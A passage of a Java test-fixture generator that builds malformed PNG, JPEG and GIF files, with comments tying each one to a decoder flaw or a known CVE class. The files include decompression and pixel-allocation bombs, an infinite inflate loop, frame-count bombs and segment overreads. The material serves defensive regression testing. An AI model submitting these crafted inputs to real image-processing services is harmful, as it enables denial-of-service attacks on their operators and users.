        // EVERY FIXTURE CARRIES VALID CRCs: failOnCorruptedData DEFAULTS TO TRUE, SO A BAD CRC
        // WOULD ABORT THE READ BEFORE THE TARGETED CODE PATH IS EVER REACHED.

        // ZLIB FDICT HANG — THE zTXt INFLATE LOOP CHECKS needsInput() BUT NEVER needsDictionary().
        // A zlib HEADER WITH THE FDICT BIT SET MAKES inflate() RETURN Z_NEED_DICT: ZERO BYTES
        // CONSUMED, ZERO PRODUCED, needsInput() FALSE — SO THE LOOP SPINS FOREVER AT 100% CPU AND
        // THE DECOMPRESSION CAP IS NEVER REACHED BECAUSE NOTHING EVER GROWS. THE IDAT PATH DOES
        // CHECK needsDictionary(), WHICH IS WHAT PROVES THIS IS AN OVERSIGHT AND NOT A DESIGN.
        // CMF/FLG 0x78,0x20: FDICT SET AND (0x78<<8|0x20) == 31*992, SO THE HEADER CHECKSUM PASSES.
        write(dir, "ztxt-fdict-hang.png", pngFile(
                ihdr(1, 1, 8, 0),
                pngChunk("zTXt", new Buf().ascii("A").u8(0).u8(0)
                        .raw(0x78, 0x20).be32(1).fill(0x00, 4).bytes()),
                idatGray1x1()));

        // SAME NON-PROGRESSING INFLATE LOOP REACHED THROUGH iTXt
        write(dir, "itxt-fdict-hang.png", pngFile(
                ihdr(1, 1, 8, 0),
                pngChunk("iTXt", new Buf().ascii("A").u8(0).u8(1).u8(0).u8(0).u8(0)
                        .raw(0x78, 0x20).be32(1).fill(0x00, 4).bytes()),
                idatGray1x1()));

        // CANVAS PIXEL BOMB — 16384x16384 RGBA PASSES THE PER-AXIS CAP BUT THE PRODUCT IS NEVER
        // CHECKED. THE CONSTRUCTOR ALLOCATES int[268435456] (1 GiB) AND allocateDirect(1 GiB)
        // BEFORE A SINGLE IDAT BYTE EXISTS. THE DEFENCE libpng SHIPS AS png_set_user_limits.
        write(dir, "canvas-pixel-bomb.png", pngFile(ihdr(16384, 16384, 8, 6)));

        // EAGER INFLATE PREALLOCATION — new byte[expected] SIZES THE INFLATE TARGET FROM THE
        // HEADER, NOT FROM THE COMPRESSED PAYLOAD. 8192x8192 16-BIT TRUECOLOR DECLARES A 384 MB
        // SCANLINE BUFFER THAT AN 8-BYTE IDAT FORCES INTO EXISTENCE AND PINS FOR THE READER'S
        // LIFETIME. INDEPENDENT OF THE CANVAS CAP: THE FILE-TO-HEAP RATIO STAYS UNBOUNDED.
        // MIRRORS libpng CVE-2011-3026 (iCCP): ALLOCATE FROM THE HEADER, NOT FROM THE DATA.
        write(dir, "inflate-preallocation.png", pngFile(
                ihdr(8192, 8192, 16, 2),
                pngChunk("IDAT", new Buf().raw(0x78, 0x9C, 0x03, 0x00, 0x00, 0x00, 0x00, 0x01).bytes())));

        // sPLT TRUNCATED AT THE PALETTE NAME — data[nullIndex + 1] READS THE SAMPLE DEPTH WITHOUT
        // CHECKING IT EXISTS. ZTXT AND ICCP BOTH GUARD THIS EXACT SHAPE; sPLT WAS MISSED.
        // libpng CVE-2015-8540: MISSING RESIDUAL-LENGTH CHECK IN AN ANCILLARY CHUNK.
        write(dir, "splt-truncated-sampledepth.png", pngFile(
                ihdr(1, 1, 8, 0),
                pngChunk("sPLT", new Buf().ascii("A").u8(0).bytes()),
                idatGray1x1()));

        // acTL num_plays = -5 FLOWS UNVALIDATED INTO ImageData's COMPACT CONSTRUCTOR, WHICH
        // ANSWERS WITH IllegalArgumentException — AN UNDECLARED RuntimeException ESCAPING A
        // readAll() THAT MAY ONLY THROW IOException, AND ONLY AFTER THE FRAME WAS ALREADY DECODED.
        write(dir, "actl-negative-loopcount.png", pngFile(
                ihdr(1, 1, 8, 0),
                pngChunk("acTL", new Buf().be32(2).be32(-5).bytes()),
                pngChunk("fcTL", fctl(0, 1, 1, 0, 0)),
                idatGray1x1()));

        // tRNS ON AN RGBA IMAGE — A WELL-FORMED CHUNK THE SPEC FORBIDS. THE CHEAPEST MEMBER OF THE
        // 18-PARSER FAMILY THAT SIGNALS MALFORMED INPUT WITH IllegalArgumentException INSTEAD OF
        // XCodecException, SO A CONSUMER CATCHING IOException IS BROKEN BY A 4-BYTE CHUNK.
        write(dir, "trns-on-rgba.png", pngFile(
                ihdr(1, 1, 8, 6),
                pngChunk("tRNS", new Buf().fill(0x00, 2).bytes()),
                pngChunk("IDAT", deflate(new byte[] { 0, 0, 0, 0, 0 }, 9))));

        // PLTE WHOSE LENGTH IS NOT A MULTIPLE OF 3 — SAME IllegalArgumentException FAMILY
        write(dir, "plte-not-multiple-of-3.png", pngFile(
                ihdr(1, 1, 8, 3),
                pngChunk("PLTE", new Buf().fill(0x00, 4).bytes())));

        // tEXt KEYWORD LONGER THAN THE 79-BYTE SPEC LIMIT — SAME FAMILY
        write(dir, "text-keyword-overlong.png", pngFile(
                ihdr(1, 1, 8, 0),
                pngChunk("tEXt", new Buf().fill('A', 80).u8(0).ascii("v").bytes()),
                idatGray1x1()));

        // NEGATIVE CHUNK LENGTH — THE PNG LENGTH FIELD IS UNSIGNED; 0x80000000 READS BACK AS A
        // NEGATIVE int AND IS REJECTED WITH A BARE java.io.IOException, INDISTINGUISHABLE FROM A
        // TRANSPORT FAILURE. EXACTLY 8 TRAILING BYTES ARE REQUIRED: WITH FEWER, THE EARLIER
        // EOFException FIRES INSTEAD AND THE TARGET LINE IS NEVER REACHED.
        write(dir, "negative-chunk-length.png", new Buf()
                .raw(PNG_SIGNATURE)
                .raw(ihdr(1, 1, 8, 0))
                .raw(0x80, 0x00, 0x00, 0x00).fill(0x00, 4)
                .bytes());

        // STRUCTURALLY PERFECT PNG CARRYING NO IMAGE DATA — readAll() ANSWERS WITH A RAW
        // EOFException. NOTE THE CANVAS ALLOCATION HAS ALREADY HAPPENED BY THEN, SO THIS COMPOSES
        // WITH THE PIXEL BOMB ABOVE.
        write(dir, "no-idat.png", pngFile(ihdr(1, 1, 8, 0)));

        // zTXt DECOMPRESSION BOMB — 4 MiB OF ONE REPEATED BYTE COMPRESSES TO A FEW KB AND TRIPS
        // THE 2 MB CAP. THE CAP ITSELF IS CORRECTLY PLACED; WHAT FAILS IS THAT IT REPORTS THE
        // BREACH WITH A BARE IOException.
        write(dir, "ztxt-zlib-bomb.png", pngFile(
                ihdr(1, 1, 8, 0),
                pngChunk("zTXt", new Buf().ascii("A").u8(0).u8(0)
                        .raw(deflate(filled(4 * 1024 * 1024, 'A'), 9)).bytes()),
                idatGray1x1()));

        // gAMA = 0x80000000 DRIVES Math.pow TO +Infinity, Math.round SATURATES TO 0x7FFFFFFF, AND
        // THE CHANNEL PACKING SHIFTS THAT OVER THE ALPHA BYTE. A 4-BYTE ANCILLARY CHUNK THEREFORE
        // TURNS A FULLY TRANSPARENT PIXEL OPAQUE WHITE — NO EXCEPTION, JUST SILENTLY DESTROYED
        // ALPHA. CVE-2018-13785 IN ITS "UNVALIDATED HEADER FIELD FEEDS DEGENERATE ARITHMETIC" FORM.
        write(dir, "gama-alpha-kill.png", pngFile(
                ihdr(1, 1, 8, 6),
                pngChunk("gAMA", new Buf().be32(0x80000000).bytes()),
                pngChunk("IDAT", deflate(new byte[] { 0, 0, 0, 0, 0 }, 9))));

        // APNG FRAME-COUNT UNDER-DECLARATION — acTL CLAIMS 2 FRAMES WHILE THE STREAM CARRIES 500.
        // scan() TRUSTS THE DECLARED FIELD, SO EVERY DOWNSTREAM MEMORY GATE IS COMPUTED FROM A LIE
        // WHILE readAll() DECODES UNTIL THE STREAM RUNS OUT, RETAINING A FULL-CANVAS DIRECT COPY
        // PER FRAME. THE APNG COUSIN OF THE sPLT/hIST HEADER-VS-PAYLOAD DESYNC FAMILY.
        final Buf apng = new Buf()
                .raw(PNG_SIGNATURE)
                .raw(ihdr(2048, 2048, 1, 0))
                .raw(pngChunk("acTL", new Buf().be32(2).be32(0).bytes()))
                .raw(pngChunk("IDAT", deflate(new byte[2048 * 257], 9)));
        for (int i = 0; i < 500; i++) {
            apng.raw(pngChunk("fcTL", fctl(i * 2, 1, 1, 0, 0)));
            apng.raw(pngChunk("fdAT", new Buf().be32(i * 2 + 1).raw(deflate(new byte[] { 0, 0 }, 9)).bytes()));
        }
        write(dir, "apng-framecount-underdeclared.png", apng.raw(PNG_IEND).bytes());
    }

    private static final byte[] PNG_SIGNATURE = { (byte) 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A };
    private static final byte[] PNG_IEND = pngChunk("IEND", new byte[0]);

    private static byte[] ihdr(final int w, final int h, final int depth, final int colorType) {
        return pngChunk("IHDR", new Buf().be32(w).be32(h).u8(depth).u8(colorType).u8(0).u8(0).u8(0).bytes());
    }

    private static byte[] fctl(final int seq, final int w, final int h, final int x, final int y) {
        return new Buf().be32(seq).be32(w).be32(h).be32(x).be32(y)
                .be16(1).be16(100).u8(0).u8(0).bytes();
    }

    // 1x1 GREYSCALE-8 IMAGE DATA: ONE FILTER BYTE PLUS ONE SAMPLE BYTE
    private static byte[] idatGray1x1() {
        return pngChunk("IDAT", deflate(new byte[] { 0, 0 }, 9));
    }

    private static byte[] pngFile(final byte[]... chunks) {
        final Buf out = new Buf().raw(PNG_SIGNATURE);
        for (final byte[] chunk: chunks) out.raw(chunk);
        return out.raw(PNG_IEND).bytes();
    }

    // ==========================================================================
    // JPEG
    // ==========================================================================
    private static void jpeg(final Path dir) throws IOException {
        Files.createDirectories(dir);

        // SOF DIMENSION BOMB — 23 BYTES. MAX_DIM BOUNDS EACH AXIS BUT NOT THE PRODUCT AND NOT THE
        // SUM ACROSS COMPONENTS: 16384x16384 WITH 3 COMPONENTS ALLOCATES int[2048*2048*64] THREE
        // TIMES = 3 GiB INSIDE readFrame, WITH NO DQT, NO DHT AND NO ENTROPY DATA IN THE FILE.
        write(dir, "sof-dimension-bomb.jpg", new Buf()
                .raw(0xFF, 0xD8)
                .raw(segment(0xC0, new Buf().u8(8).be16(16384).be16(16384).u8(3)
                        .raw(1, 0x11, 0).raw(2, 0x11, 0).raw(3, 0x11, 0).bytes()))
                .raw(0xFF, 0xD9)
                .bytes());

        // PROGRESSIVE AC-REFINE EOB-RUN BLOWUP — refineNonZero WALKS ALL 63 AC POSITIONS PER BLOCK
        // BUT ONLY CONSUMES BITS WHEN A COEFFICIENT IS NON-ZERO. WITH NO PRIOR AC-FIRST SCAN EVERY
        // COEFFICIENT IS ZERO, SO ONE 15-BIT EOB SYMBOL BUYS 16384 BLOCKS x 63 ITERATIONS FOR FREE.
        // NOTHING VALIDATES SCAN ORDERING OR CAPS THE SCAN COUNT, SO THE COST IS LINEAR IN FILE
        // SIZE AT ~400,000 ITERATIONS PER BYTE. libjpeg-turbo CAPS SCANS FOR EXACTLY THIS REASON.
        // GEOMETRY: 4096x4096 SINGLE COMPONENT -> 512x512 = 262144 BLOCKS = 16 x 16384, SO 16 EOB
        // SYMBOLS x 15 BITS = 240 BITS = EXACTLY 30 ZERO BYTES PER SCAN, WITH NO 0xFF STUFFING.
        final Buf eob = new Buf()
                .raw(0xFF, 0xD8)
                .raw(segment(0xDB, new Buf().u8(0).fill(0x01, 64).bytes()))
                .raw(segment(0xC4, new Buf().u8(0x00).u8(1).fill(0x00, 15).u8(0x00).bytes()))
                .raw(segment(0xC4, new Buf().u8(0x10).u8(1).fill(0x00, 15).u8(0xE0).bytes()))
                .raw(segment(0xC2, new Buf().u8(8).be16(4096).be16(4096).u8(1).raw(1, 0x11, 0).bytes()));
        for (int i = 0; i < 500; i++) {
            // Ss=1, Se=63, Ah=1, Al=0 -> A REFINEMENT SCAN THAT NO FIRST-PASS SCAN EVER PRECEDED
            eob.raw(segment(0xDA, new Buf().u8(1).raw(1, 0x00).u8(1).u8(63).u8(0x10).bytes()));
            eob.fill(0x00, 30);
        }
        write(dir, "progressive-eobrun-blowup.jpg", eob.raw(0xFF, 0xD9).bytes());

        // REPEATED SOF — T.81 PERMITS ONE FRAME HEADER; THE PARSER ENFORCES NOTHING. EACH 19-BYTE
        // SEGMENT DROPS THE PREVIOUS COEFFICIENT ARRAYS AND ALLOCATES A FRESH ZEROED SET, SO PEAK
        // LIVE MEMORY STAYS FLAT (NO OOM STOPS IT) WHILE THE JVM IS FORCED TO ALLOCATE AND ZERO
        // 48 MiB PER SEGMENT. libjpeg ANSWERS A SECOND FRAME HEADER WITH JERR_SOF_DUPLICATE.
        final Buf sofs = new Buf().raw(0xFF, 0xD8);
        for (int i = 0; i < 200; i++) {
            sofs.raw(segment(0xC0, new Buf().u8(8).be16(2048).be16(2048).u8(3)
                    .raw(1, 0x11, 0).raw(2, 0x11, 0).raw(3, 0x11, 0).bytes()));
        }
        write(dir, "repeated-sof-churn.jpg", sofs.raw(0xFF, 0xD9).bytes());

        // TRUNCATED SEGMENT — SOF DECLARES Lf=17 AND SUPPLIES 3 BYTES. THE COMMONEST TRUNCATION
        // SHAPE, AND IT SURFACES AS A RAW java.io.EOFException OUTSIDE THE SEALED HIERARCHY, SO A
        // RETRY-DRIVEN PIPELINE RE-FETCHES A PERMANENTLY MALFORMED URL FOREVER.
        write(dir, "truncated-segment.jpg", new Buf()
                .raw(0xFF, 0xD8, 0xFF, 0xC0, 0x00, 0x11, 0x08, 0x00, 0x01).bytes());

        // DHT READS PAST ITS OWN SEGMENT — Lh=3 LEAVES ONE BYTE, THE PARSER CONSUMES IT AS Tc/Th
        // AND THEN READS 16 COUNT BYTES WITHOUT RE-CHECKING remaining(), SWALLOWING THE EOI MARKER
        // AS TABLE DATA. THE SHAPE OF CVE-2013-6629's get_dht: TABLE DATA READ WITHOUT HONOURING
        // THE DECLARED SEGMENT LENGTH.
        write(dir, "dht-segment-overread.jpg", new Buf()
                .raw(0xFF, 0xD8, 0xFF, 0xC4, 0x00, 0x03, 0x00, 0xFF, 0xD9).bytes());

        // SOF DECLARING Lf=8 WHILE Nf=3 — THE COMPONENT LOOP READS PAST THE SEGMENT END AND THEN
        // data.position(end) REWINDS, SO THE PARSER SILENTLY ADOPTS COMPONENT GEOMETRY TAKEN FROM
        // BYTES THE SEGMENT NEVER DECLARED AND RESUMES AS IF NOTHING HAPPENED.
        write(dir, "sof-length-mismatch.jpg", new Buf()
                .raw(0xFF, 0xD8)
                .raw(0xFF, 0xC0, 0x00, 0x08, 0x08, 0x00, 0x10, 0x00, 0x10, 0x03)
                .raw(0x01, 0x44, 0x00)
                .fill(0x00, 16)
                .raw(0xFF, 0xD9)
                .bytes());

        // TRUNCATED ENTROPY STREAM — A COMPLETE BASELINE HEADER SET WITH ZERO ENTROPY BYTES. THE
        // FIRST HUFFMAN DECODE MEETS THE EOI IMMEDIATELY. ANOTHER RAW EOFException SITE.
        write(dir, "truncated-entropy.jpg", new Buf()
                .raw(0xFF, 0xD8)
                .raw(segment(0xDB, new Buf().u8(0).fill(0x01, 64).bytes()))
                .raw(segment(0xC4, new Buf().u8(0x00).u8(1).fill(0x00, 15).u8(0x00).bytes()))
                .raw(segment(0xC4, new Buf().u8(0x10).u8(1).fill(0x00, 15).u8(0x00).bytes()))
                .raw(segment(0xC0, new Buf().u8(8).be16(16).be16(16).u8(1).raw(1, 0x11, 0).bytes()))
                .raw(segment(0xDA, new Buf().u8(1).raw(1, 0x00).u8(0).u8(63).u8(0x00).bytes()))
                .raw(0xFF, 0xD9)
                .bytes());

        // CHROMA SAMPLED TALLER THAN LUMA — writeColorBgra CLAMPS EVERY CHROMA INDEX BUT INDEXES
        // THE LUMA PLANE RAW. THAT IS SAFE ONLY BECAUSE resolveNativeFormat, 250 LINES AWAY,
        // ACCEPTS EXACTLY THREE SAMPLING LAYOUTS. THIS FIXTURE IS THE NEGATIVE REGRESSION THAT
        // PINS THAT COUPLING: IT MUST STAY REJECTED. CVE-2018-14498 / CVE-2017-15232 SHAPE.
        write(dir, "chroma-taller-than-luma.jpg", new Buf()
                .raw(0xFF, 0xD8)
                .raw(segment(0xDB, new Buf().u8(0).fill(0x01, 64).bytes()))
                .raw(segment(0xC0, new Buf().u8(8).be16(64).be16(64).u8(3)
                        .raw(1, 0x11, 0).raw(2, 0x12, 1).raw(3, 0x12, 1).bytes()))
                .raw(0xFF, 0xD9)
                .bytes());

        // SOF1 IS EXTENDED SEQUENTIAL HUFFMAN — BIT-IDENTICAL TO SOF0 FOR 8-BIT DATA AND TRIVIALLY
        // DECODABLE HERE, YET hasSegmentLength SWALLOWS THE WHOLE 0xC0-0xCF BLOCK AS ANONYMOUS
        // PADDING, SO THE FRAME HEADER VANISHES AND THE FILE FAILS WITH THE MISLEADING
        // "scan before frame header". ARITHMETIC AND LOSSLESS FRAMES FAIL THE SAME WRONG WAY.
        write(dir, "sof1-silently-skipped.jpg", new Buf()
                .raw(0xFF, 0xD8)
                .raw(segment(0xDB, new Buf().u8(0).fill(0x01, 64).bytes()))
                .raw(segment(0xC1, new Buf().u8(8).be16(16).be16(16).u8(1).raw(1, 0x11, 0).bytes()))
                .raw(segment(0xDA, new Buf().u8(1).raw(1, 0x00).u8(0).u8(63).u8(0x00).bytes()))
                .raw(0xFF, 0xD9)
                .bytes());
    }

    // JPEG SEGMENT: MARKER, THEN A BIG-ENDIAN LENGTH THAT COUNTS ITSELF, THEN THE PAYLOAD
    private static byte[] segment(final int marker, final byte[] payload) {
        return new Buf().raw(0xFF, marker).be16(payload.length + 2).raw(payload).bytes();
    }

    private static byte[] filled(final int count, final int value) {
        final byte[] out = new byte[count];
        java.util.Arrays.fill(out, (byte) value);
        return out;
    }

    // ==========================================================================
    // GIF
    // ==========================================================================
    private static void gif(final Path dir) throws IOException {
        Files.createDirectories(dir);

        // CANVAS ALLOCATION BOMB — 13 BYTES DECLARING A 16384x16384 LOGICAL SCREEN. THE READER
        // CONSTRUCTOR ALLOCATES int[w*h] (1 GiB) PLUS allocateDirect(w*h*4) (1 GiB) BEFORE PARSING
        // A SINGLE FRAME BYTE. MIRRORS THE giflib CVE-2019-15133 CLASS: THE HEADER DECLARES THE
        // ALLOCATION AND THE FILE NEVER HAS TO CARRY THE PIXELS. AMPLIFICATION ~165,000,000x.
        write(dir, "canvas-allocation-bomb.gif", new Buf()
                .ascii("GIF89a")
                .le16(16384).le16(16384)
                .u8(0x00)   // PACKED: NO GLOBAL COLOR TABLE
                .u8(0x00)   // BACKGROUND COLOR INDEX
                .u8(0x00)   // PIXEL ASPECT RATIO
                .bytes());

        // FRAME-COUNT BOMB — 4096x4096 CANVAS (64 MiB PER FRAME) PLUS 64 MINIMAL 12-BYTE FRAMES.
        // EACH FRAME COSTS 12 INPUT BYTES BUT MAKES readAll() RETAIN A FULL-CANVAS DIRECT COPY,
        // SO 788 BYTES REQUEST 4 GiB. THE "MILLIONS OF TINY FRAMES" ANIMATION BOMB (libgd /
        // ImageMagick / Android GifDecoder FRAME-COUNT DoS).
        final Buf frames = new Buf()
                .ascii("GIF89a")
                .le16(4096).le16(4096)
                .u8(0x80)   // PACKED: GLOBAL COLOR TABLE, SIZE BITS 0 -> 2 ENTRIES
                .u8(0x00).u8(0x00)
                .raw(0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF); // GCT: BLACK, WHITE
        for (int i = 0; i < 64; i++) frames.raw(minimalGifFrame());
        write(dir, "frame-count-bomb.gif", frames.u8(0x3B).bytes());

        // TRUNCATED GLOBAL COLOR TABLE — DECLARES A 2-ENTRY GCT (6 BYTES) AND SUPPLIES ONLY 3.
        // THE READER ANSWERS WITH A RAW java.io.EOFException, WHICH SITS OUTSIDE THE SEALED
        // XCodecException HIERARCHY AND SO MAKES A MALFORMED IMAGE INDISTINGUISHABLE FROM A
        // SOCKET FAILURE AT EVERY CALL SITE.
        write(dir, "truncated-color-table.gif", new Buf()
                .ascii("GIF89a")
                .le16(1).le16(1)
                .u8(0x80).u8(0x00).u8(0x00)
                .raw(0x00, 0x00, 0x00)
                .bytes());

        // UNTERMINATED LZW SUB-BLOCK CHAIN — DECLARES A 5-BYTE SUB-BLOCK THEN ENDS. THE MOST
        // COMMON MALFORMED-GIF SHAPE IN THE WILD; ALSO SURFACES AS A RAW EOFException.
        write(dir, "unterminated-subblock.gif", new Buf()
                .ascii("GIF89a")
                .le16(1).le16(1)
                .u8(0x80).u8(0x00).u8(0x00)                 // GCT SO THE FRAME REACHES THE LZW READER
                .raw(0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF)
                .u8(0x2C).le16(0).le16(0).le16(1).le16(1).u8(0x00)
                .u8(0x02)   // LZW MINIMUM CODE SIZE
                .u8(0x05).raw(0xAA, 0xAA, 0xAA, 0xAA, 0xAA) // 5-BYTE SUB-BLOCK, NO TERMINATOR
                .bytes());

        // LZW DICTIONARY CARRY-OVER — FRAME 1 SEEDS ENTRIES 6..8, FRAME 2 IMMEDIATELY REFERENCES
        // ENTRY 6 AS ITS FIRST CODE. THE oldCode == -1 BRANCH IS EVALUATED BEFORE THE KwKwK
        // HANDLER, SO THE DECODER READS A DICTIONARY SLOT THE CURRENT FRAME NEVER DEFINED —
        // THE READ SIDE OF THE giflib CVE-2018-11490 CLASS. JAVA ZERO-INITIALISATION MEANS THIS
        // LEAKS NO JVM MEMORY, BUT A CONFORMING DECODER MUST REJECT THE UNDEFINED REFERENCE.
        // FRAME 2 DECODING TO GREEN (PALETTE 2) INSTEAD OF BLACK (PALETTE 0) IS THE PROOF.
        write(dir, "lzw-stale-dictionary.gif", new Buf()
                .ascii("GIF89a")
                .le16(2).le16(2)
                .u8(0x81).u8(0x00).u8(0x00) // PACKED: GCT, SIZE BITS 1 -> 4 ENTRIES
                .raw(0x00, 0x00, 0x00, 0xFF, 0x00, 0x00, 0x00, 0xFF, 0x00, 0x00, 0x00, 0xFF)
                // FRAME 1: CODES CLEAR(4)@3b, 1@3b, 2@3b, 3@3b, 1@4b -> 0x168C LSB-FIRST
                .u8(0x2C).le16(0).le16(0).le16(2).le16(2).u8(0x00)
                .u8(0x02).u8(0x02).raw(0x8C, 0x16).u8(0x00)
                // FRAME 2: CODES 6@3b, EOI(5)@3b -> 0x2E. CODE 6 == available WITH oldCode == -1
                .u8(0x2C).le16(0).le16(0).le16(1).le16(1).u8(0x00)
                .u8(0x02).u8(0x01).raw(0x2E).u8(0x00)
                .u8(0x3B)
                .bytes());

        // GCE BLOCK-SIZE DIVERGENCE — THE GRAPHIC CONTROL EXTENSION DECLARES BLOCK SIZE 5 WHERE
        // THE SPEC MANDATES 4. THE STATIC scan() PRE-PASS REJECTS IT AND REPORTS frameCount()==1,
        // WHILE THE REAL DECODE IGNORES THE FIELD AND WALKS EVERY FRAME. A PARSER DIFFERENTIAL:
        // TWO PARSERS DISAGREEING ON ONE FILE TURNS A VALIDATION PASS INTO A BYPASS.
        final Buf gce = new Buf()
                .ascii("GIF89a")
                .le16(64).le16(64)
                .u8(0x80).u8(0x00).u8(0x00)
                .raw(0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF)
                .raw(0x21, 0xF9, 0x05, 0x00, 0x0A, 0x00, 0x00, 0x00); // BLOCK SIZE 5, MUST BE 4
        for (int i = 0; i < 4; i++) gce.raw(minimalGifFrame());
        write(dir, "gce-blocksize-divergence.gif", gce.u8(0x3B).bytes());

        // METADATA ACCUMULATION — A FOREVER-LOOPING ANIMATION WHOSE APPLICATION-EXTENSION RECORDS
        // SIT *AFTER* THE FIRST IMAGE SEPARATOR, SO THEY FALL PAST reset()'s REPLAY BOUNDARY AND
        // ARE RE-PARSED AND RE-ACCUMULATED ON EVERY LOOP. NEITHER THE EXTENSION LIST NOR THE
        // METADATA COMMENT LIST IS CAPPED OR CLEARED ON reset(): A MONOTONIC HEAP CLIMB WITH NO
        // EXCEPTION AND A STACK TRACE THAT NEVER IMPLICATES THE DECODER. MIRRORS THE libgd /
        // ImageMagick UNBOUNDED PROFILE-CHUNK ACCUMULATION FAMILY.
        final Buf meta = new Buf()
                .ascii("GIF89a")
                .le16(64).le16(64)
                .u8(0x80).u8(0x00).u8(0x00)
                .raw(0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF)
                .raw(0x21, 0xFF, 0x0B).ascii("NETSCAPE2.0").raw(0x03, 0x01, 0x00, 0x00, 0x00)
                .raw(minimalGifFrame());
        for (int i = 0; i < 5000; i++) meta.raw(0x21, 0xFF, 0x00, 0x00); // EMPTY APP EXTENSION
        for (int i = 0; i < 256; i++) meta.raw(minimalGifFrame());
        write(dir, "metadata-accumulation.gif", meta.u8(0x3B).bytes());
    }

    // SMALLEST LEGAL FRAME: A 1x1 IMAGE DESCRIPTOR WITH AN EMPTY LZW SUB-BLOCK CHAIN. TWELVE
    // INPUT BYTES THAT STILL COST A FULL CANVAS COPY IN readAll().
    private static byte[] minimalGifFrame() {
        return new Buf()
                .u8(0x2C).le16(0).le16(0).le16(1).le16(1).u8(0x00)
                .u8(0x02)   // LZW MINIMUM CODE SIZE
                .u8(0x00)   // SUB-BLOCK TERMINATOR: ZERO LZW BYTES
                .bytes();
    }

    // ==========================================================================
    // SHARED
    // ==========================================================================
    private static void write(final Path dir, final String name, final byte[] data) throws IOException {
        Files.write(dir.resolve(name), data);
        System.out.printf("  %-40s %,10d bytes%n", dir.getFileName() + "/" + name, data.length);
    }

    /** Append-only byte builder; the fixtures are hand-packed headers, so capacity grows as needed. */
    static final class Buf {
        private byte[] a = new byte[256];
        private int n;

        Buf u8(final int v) { return this.raw(new byte[] { (byte) v }); }

        Buf le16(final int v) { return this.raw(new byte[] { (byte) v, (byte) (v >> 8) }); }

        Buf be16(final int v) { return this.raw(new byte[] { (byte) (v >> 8), (byte) v }); }

        Buf le24(final int v) { return this.raw(new byte[] { (byte) v, (byte) (v >> 8), (byte) (v >> 16) }); }

        Buf le32(final int v) { return this.raw(new byte[] { (byte) v, (byte) (v >> 8), (byte) (v >> 16), (byte) (v >> 24) }); }

        Buf be32(final int v) { return this.raw(new byte[] { (byte) (v >> 24), (byte) (v >> 16), (byte) (v >> 8), (byte) v }); }

        Buf ascii(final String s) { return this.raw(s.getBytes(StandardCharsets.US_ASCII)); }

        Buf fill(final int value, final int count) { return this.raw(filled(count, value)); }

        // VARARGS TAKES int SO CALL SITES CAN WRITE 0xFF WITHOUT A CAST ON EVERY LITERAL
        Buf raw(final int... vs) {
            final byte[] b = new byte[vs.length];
            for (int i = 0; i < vs.length; i++) b[i] = (byte) vs[i];
            return this.raw(b);
        }

        Buf raw(final byte[] b) {
            if (this.n + b.length > this.a.length) {
                final byte[] grown = new byte[Math.max(this.a.length * 2, this.n + b.length)];
                System.arraycopy(this.a, 0, grown, 0, this.n);
                this.a = grown;
            }
            System.arraycopy(b, 0, this.a, this.n, b.length);
            this.n += b.length;
            return this;
        }

        int size() { return this.n; }

        byte[] bytes() {
            final byte[] out = new byte[this.n];
            System.arraycopy(this.a, 0, out, 0, this.n);
            return out;
        }
    }

    /** Deflates a payload, used by the PNG zlib-bomb and compressed-text fixtures. */
    static byte[] deflate(final byte[] raw, final int level) {
        final Deflater d = new Deflater(level);
        d.setInput(raw);
        d.finish();
        final byte[] buf = new byte[8192];
        final Buf out = new Buf();
        while (!d.finished()) {
            final int k = d.deflate(buf);
            final byte[] chunk = new byte[k];
            System.arraycopy(buf, 0, chunk, 0, k);
            out.raw(chunk);
        }
        d.end();
        return out.bytes();
    }

    /** Builds a PNG chunk with a correct CRC over type+payload. */
    static byte[] pngChunk(final String type, final byte[] payload) {
        final CRC32 crc = new CRC32();
        final byte[] t = type.getBytes(StandardCharsets.US_ASCII);
        crc.update(t);
        crc.update(payload);
        return new Buf().be32(payload.length).raw(t).raw(payload).be32((int) crc.getValue()).bytes();
    }
}
